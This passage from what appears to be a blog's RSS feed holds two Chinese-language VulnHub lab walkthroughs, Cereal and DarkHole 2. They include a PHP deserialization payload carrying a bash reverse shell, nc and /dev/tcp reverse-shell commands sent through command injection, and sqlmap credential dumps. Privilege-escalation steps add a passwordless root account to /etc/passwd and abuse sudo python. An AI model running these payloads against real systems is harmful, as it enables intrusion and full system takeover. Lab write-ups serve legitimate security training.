2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQxL2JhY2tfZW4v&#34;&gt;http://secure.cereal.ctf:44441/back_en/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1329.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到一个备份文件 index.php.bak, 打开之后发现了源码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1330.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;看源代码可以规范代码的格式，阅读此处的 php 代码查看反序列化造成的原因&lt;br&gt;
 view-source:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQxL2JhY2tfZW4vaW5kZXgucGhwLmJhaw==&#34;&gt;http://secure.cereal.ctf:44441/back_en/index.php.bak&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1331.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;isValid 默认为 False，从浏览器发送请求时，会进入 if，并检查该值是否为&lt;br&gt;
 IP 地址。尝试注入命令时，它拒绝了输入，如果我们在请求中发送值 True，则&lt;br&gt;
根本不会执行 if 块。会直接调用 ping 方法。通过 shell_exec 函数执行命令。&lt;br&gt;
需要先实例化、在进行序列化和 url 编码：&lt;/p&gt;
&lt;?php
class pingTest {
public $ipAddress = &#34;;bash -i &gt;&amp; /dev/tcp/192.168.31.18/4444 0&gt;&amp;1 &#34;;
public $isValid = True;
}
$obj = NEW pingTest;
$serilaze= serialize($obj);
echo urlencode($serilaze);
?&gt;
&lt;p&gt;可以在线 php 执行，输出内容如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1332.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;也可以用 php 去执行下面的代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1333.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;得到漏洞利用代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#得到漏洞利用代码&#34;&gt;#&lt;/a&gt; 得到漏洞利用代码：&lt;/h3&gt;
&lt;p&gt;O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs&lt;br&gt;
%3A45%3A%22%3Bbash±&lt;br&gt;
i+%3E%26+%2Fdev%2Ftcp%2F192.168.31.15%2F4444+0%3E%261+%22%3Bs%&lt;br&gt;
3A7%3A%22isValid%22%3Bb%3A1%3B%7D&lt;/p&gt;
&lt;p&gt;将 payload 发送到 burp 中，用 burp 发送此恶意数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1334.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;同时在 kali 上监听端口，得到了反弹的 shell，并进行终端优化&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1335.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;004-pspy监控ln软连接chown权限赋予root密码置空&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-pspy监控ln软连接chown权限赋予root密码置空&#34;&gt;#&lt;/a&gt; 004 pspy 监控，ln 软连接，chown 权限赋予，root 密码置空&lt;/h3&gt;
&lt;p&gt;上 pspy 监控看看，看到了一个脚本被定期执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1336.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;chown 是用来改变用户和用户组权限的，这个脚本可以更改位于用户 rocky 的&lt;br&gt;
主目录中的文件 public_html 内容的所有者，当前用户 apache 组，apache 用&lt;br&gt;
户可以访问目录中的文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1337.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试直接修改 /etc/passwd 中的用户，生成一个无密码的是 root 权限的账户&lt;br&gt;
 ln -s /etc/passwd/home/rocky/public_html/etcpasswd&lt;br&gt;
ln -s 后，对添加软连接的地方做出改变则原文件也发生了改变&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1338.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;等待定时任务被执行后，/etc/passwd 就会因为我们设置的软连接&lt;br&gt;
 /home/rocky/public_html/etcpasswd 的权限被修改为 rocky:apache，而&lt;br&gt;
 /etc/passwd 的权限也被改变为了 apache 可操作的文件&lt;/p&gt;
&lt;p&gt;echo “mhq::0:0:root:/root:/bin/bash” &amp;gt;&amp;gt; /etc/passwd&lt;br&gt;
 删除了 x，也就是删除 root 用户的密码身份验证&lt;br&gt;
通过 su mhq 可以直接无密码升级到 root 权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1339.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;可以检验一下，现在我们 root 密码仍然未知，但是 mhq 的用户密码 x 不存在，&lt;br&gt;
故可以直接通过一个普通用户提权到 root&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1340.png&#34; alt&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/142%20DARKHOLE2/</guid>
            <title>VULNHUB 42 DARKHOLE2</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/142%20DARKHOLE2/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGFya2hvbGUtMiw3NDAv&#34;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2RkLWJsb2cvcC8xNTIzMDgyNi5odG1s&#34;&gt;https://www.cnblogs.com/wdd-blog/p/15230826.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168.31.xx (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 CENGBOX 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1192.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;再次对其开放的端口进行详细的扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#再次对其开放的端口进行详细的扫描&#34;&gt;#&lt;/a&gt; 再次对其开放的端口进行详细的扫描&lt;/h3&gt;
&lt;p&gt;sudo nmap -A -p- 192.168.31.12 --min-rate=5000&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1193.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;à 靶机 ip：192.168.31. 12 、靶机开放端口 22 , 80&lt;br&gt;
 并且扫描到了再 80 端口上是存在 git 源码泄漏的&lt;/p&gt;
&lt;h3 id=&#34;002-信息收集git源码泄漏利用git-log切换git分支&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-信息收集git源码泄漏利用git-log切换git分支&#34;&gt;#&lt;/a&gt; 002 信息收集，.git 源码泄漏利用，git log 切换 git 分支&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEu&#34;&gt;http://192.168.31.&lt;/span&gt; 12 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1194.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;目测是没有什么有价值的信息，直接开始用 gobuster 扫描目录&lt;br&gt;
 gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEu&#34;&gt;http://192.168.31.&lt;/span&gt; 12&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1195.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;依次对得到的目录信息进行访问搜索有价值的信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#依次对得到的目录信息进行访问搜索有价值的信息&#34;&gt;#&lt;/a&gt; 依次对得到的目录信息进行访问搜索有价值的信息&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvbG9naW4ucGhw&#34;&gt;http://192.168.31.12/login.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1196.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvZGFzaGJvYXJkLnBocA==&#34;&gt;http://192.168.31.12/dashboard.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1197.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnLw==&#34;&gt;http://192.168.31.12/config/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1198.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnL2NvbmZpZy5waHA=&#34;&gt;http://192.168.31.12/config/config.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1199.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，&lt;br&gt;
和一个不被允许进入的 dashboard.php 两个信息&lt;/p&gt;
&lt;p&gt;在端口扫描阶段因为有.git 的信息，对.git 进行访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=&#34;&gt; http://192.168.31.12/.git/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1200.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;利用 githack 对源码泄漏进行利用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1201.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;wget &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL0dpdEhhY2svYXJjaGl2ZS9yZWZzL2hlYWRzL21hc3Rlci56aXA=&#34;&gt;https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip&lt;/span&gt; - O Githack.zip&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;q;unzip -q Githack.zip;cd GitHack-master;&lt;br&gt;
python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0dpdEhhY2sucHk=&#34;&gt;GitHack.py&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdA==&#34;&gt;http://192.168.31.12/.git&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1202.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过.git 文件可以得到此项目的源码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1203.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;源码中有 config 是敏感文件，进行读取&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1204.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到了数据的账户密码 root:darkhole_2&lt;/p&gt;
&lt;p&gt;但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命&lt;br&gt;
令去获取到之前提交的版本，除了 githack 的利用方式之外还可以用如下方式&lt;br&gt;
 TF=$(mktemp -d); cd $TF;wget -r &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=&#34;&gt;http://192.168.31.12/.git/&lt;/span&gt; - q;cd $TF/192.168.31.12&lt;br&gt;
&amp;amp;&amp;amp; git clone. webapp &amp;amp;&amp;amp; cd webapp&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1205.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过这种方式可以得到.git 文件，执行 git 的相关命令&lt;/p&gt;
&lt;p&gt;git log 查看之前提交的版本&lt;br&gt;
看到有一次提交信息是涉及到 login.php 的，切换到该分支查看&lt;br&gt;
 git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1206.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 login.php 内容中看到了用户名和密码 lush@admin.com:321&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1207.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;003-sql注入拿数据-sqlmap一把梭-敏感端口查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-sql注入拿数据-sqlmap一把梭-敏感端口查看&#34;&gt;#&lt;/a&gt; 003 sql 注入拿数据、sqlmap 一把梭、敏感端口查看&lt;/h3&gt;
&lt;h3 id=&#34;通过得到的用户名和密码进入到了对方后台管理中心&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过得到的用户名和密码进入到了对方后台管理中心&#34;&gt;#&lt;/a&gt; 通过得到的用户名和密码进入到了对方后台管理中心&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1208.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x&#34;&gt;http://192.168.31.94/dashboard.php?id=1&lt;/span&gt;&lt;br&gt;
 观察 url 地址，似乎是存在 sql 注入的，通过 burp 截取数据包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1209.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;sqlmap -r 1.txt --dbs --batch&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1210.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;跑出来了数据库的名字 darkhole_2，继续测试数据库中有哪些表&lt;br&gt;
 sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1211.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到两张表，选取 ssh 表去查看有哪些列&lt;br&gt;
 sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1212.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到此表下的三个字段 user、id、pass&lt;br&gt;
sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1213.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;最终得到了数据库的用户名和密码 jehad:fool&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1214.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;凭借凭据 jehad 拿到了靶机上一个普通用户的权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1215.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;但是这个 ssh 登陆成功之后显示的东西是比较多的，这么多的系统信息显示出&lt;br&gt;
来是没必要的，而且会有 last login 可以看到最后登陆的 ip，这些信息也是可以&lt;br&gt;
处理的，后面会对这个信息进行自定义&lt;/p&gt;
&lt;p&gt;查看靶机上有没有开放特殊的端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1216.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;004-curl访问网站及命令注入-bash的base-64-反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-curl访问网站及命令注入-bash的base-64-反弹shell&#34;&gt;#&lt;/a&gt; 004 curl 访问网站及命令注入、bash 的 base 64 反弹 shell&lt;/h3&gt;
&lt;h3 id=&#34;发现在这台服务器上有-9999-端口正在运行但是此端口被防火墙关掉了我们&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现在这台服务器上有-9999-端口正在运行但是此端口被防火墙关掉了我们&#34;&gt;#&lt;/a&gt; 发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们&lt;/h3&gt;
&lt;p&gt;在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当&lt;br&gt;
然也可以通过 curl 命令在这台 linux 机器上直接访问此网站&lt;/p&gt;
&lt;p&gt;curl -vv 127.0.0.1:9999&lt;br&gt;
 可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php&lt;br&gt;
 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1217.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;执行系统命令看当前这个网站是属于哪个用户下的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#执行系统命令看当前这个网站是属于哪个用户下的&#34;&gt;#&lt;/a&gt; 执行系统命令，看当前这个网站是属于哪个用户下的&lt;/h3&gt;
&lt;p&gt;curl 127.0.0.1:9999?cmd=id;echo ’ ’&lt;br&gt;
echo ’ &#39; 的作用使回显比较美观一些，没有实际的作用&lt;br&gt;
得到了此网站是由用户 losy 的权限搞的，现在需要把 losy 用户的 shell 反弹&lt;br&gt;
判断 losy 是否可以使用 nc 命令反弹 shell&lt;br&gt;
curl 127.0.0.1:9999?cmd=which%20nc;echo ’ ’&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1218.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;使用 nc 反弹 shell，并在 kali 上进行监听&lt;br&gt;
 curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo ‘’&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1219.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要&lt;br&gt;
都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了&lt;/p&gt;
&lt;p&gt;curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-&lt;br&gt;
i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27&lt;br&gt;
 采用的命令即是：bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 99 /4444 0&amp;gt;&amp;amp;1’&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1220.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;调整为一个标准的 tty 终端&lt;br&gt;
 python3 -c “import pty;pty.spawn (’/bin/bash’)”&lt;br&gt;
python3 -c “&lt;strong&gt;import&lt;/strong&gt;(‘pty’).spawn(’/bin/bash’)”&lt;br&gt;
stty -a&lt;br&gt;
stty raw -echo;fg&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1221.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;调整 TERM、stty 的窗口大小&lt;br&gt;
 export TERM=xterm&lt;br&gt;
stty rows 31 columns 118&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1222.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;此刻的我们已经拿到了 losy 用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;005-pspy监控-历史遗留信息-权限错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#005-pspy监控-历史遗留信息-权限错误提权&#34;&gt;#&lt;/a&gt; 005 pspy 监控、历史遗留信息、权限错误提权&lt;/h3&gt;
&lt;p&gt;在 kali 上给靶机传输一个 pspy 看看有没有敏感任务被执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1223.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;看到在 /opt/web 下有一个 php 启动本地 9999 端口的命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1224.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;由此造成了-9999-端口处的命令执行漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#由此造成了-9999-端口处的命令执行漏洞&#34;&gt;#&lt;/a&gt; 由此造成了 9999 端口处的命令执行漏洞&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1225.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码&lt;br&gt;
发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1226.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过 sudo - l 查到了一条隐私设置错误的记录&lt;br&gt;
 sudo -u root python3 -c “&lt;strong&gt;import&lt;/strong&gt;(‘os’).system(’/bin/bash’)”&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1227.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;提权成功拿到了 root 权限&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;006-ssh登陆显示信息-登陆前后及系统信息-lastlogin信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#006-ssh登陆显示信息-登陆前后及系统信息-lastlogin信息&#34;&gt;#&lt;/a&gt; 006 ssh 登陆显示信息、登陆前后及系统信息、lastlogin 信息&lt;/h3&gt;
&lt;p&gt;对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要&lt;br&gt;
的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1228.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;这是默认显示的信息分了两部分上面的是打印的系统信息下面的是最后&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这是默认显示的信息分了两部分上面的是打印的系统信息下面的是最后&#34;&gt;#&lt;/a&gt; 这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后&lt;/h3&gt;
&lt;p&gt;登陆到此服务器的时间和 ip&lt;/p&gt;
&lt;p&gt;上边的信息来自来自 /run/motd.dynamic 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1229.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;这个文件的信息无法修改哪怕被清空了也会复原&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这个文件的信息无法修改哪怕被清空了也会复原&#34;&gt;#&lt;/a&gt; 这个文件的信息无法修改，哪怕被清空了也会复原。&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1230.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-&lt;br&gt;
motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。&lt;br&gt;
chmod -x /etc/update-motd.d/*;echo &amp;gt; /run/motd.dynamic;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1231.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;反之赋予这个文件夹所有文件可执行权限之后可以显示出系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反之赋予这个文件夹所有文件可执行权限之后可以显示出系统信息&#34;&gt;#&lt;/a&gt; 反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息&lt;/h3&gt;
&lt;p&gt;开启 linux 系统信息展示：chmod +x /etc/update-motd.d/*&lt;/p&gt;
&lt;p&gt;下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修&lt;br&gt;
改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：&lt;br&gt;
sed -i ‘s/#PrintLastLog yes/PrintLastLog no/g’ /etc/ssh/sshd_config;systemctl restart&lt;br&gt;
sshd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1232.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;最后登陆的消息一般来说比较重要可以方便的看到自己的机器是否有异地登&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后登陆的消息一般来说比较重要可以方便的看到自己的机器是否有异地登&#34;&gt;#&lt;/a&gt; 最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1233.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;陆的情况出现开启最后登陆的日志命令如下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#陆的情况出现开启最后登陆的日志命令如下&#34;&gt;#&lt;/a&gt; 陆的情况出现，开启最后登陆的日志命令如下：&lt;/h3&gt;
&lt;p&gt;很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后&lt;br&gt;
显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE=&#34;&gt; https://www.bootschool.net/ascii 上进行字母的图形编码&lt;/span&gt;&lt;br&gt;
开启 linux 登陆 logo 提示：&lt;br&gt;
echo -e ‘\n\n\t\t██╗ ██╗ ████████╗\n\t\t╚██╗██╔╝&lt;br&gt;
╚══██╔══╝\n\t\t ╚███╔╝ ██║ \n\t\t ██╔██&lt;br&gt;
╗ ██║ \n\t\t██╔╝ ██╗███████╗██║ \n\t\t&lt;br&gt;
╚═╝ ╚═╝╚══════╝╚═╝\n’ &amp;gt; /etc/motd&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;e 表示开启转义 \n 表示换行 \t 表示 tab 按键&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1234.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;关闭这个 logo 提示，只需要将 /etc/motd 清空就可以&lt;br&gt;
 echo &amp;gt; /etc/motd;vim /etc/motd +&amp;quot;d 1&amp;quot; +wq 会有一个空格&lt;br&gt;
 cat /dev/null &amp;gt; /etc/motd 没有任何东西，直接清空文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1235.png&#34; alt&gt;&lt;/p&gt;
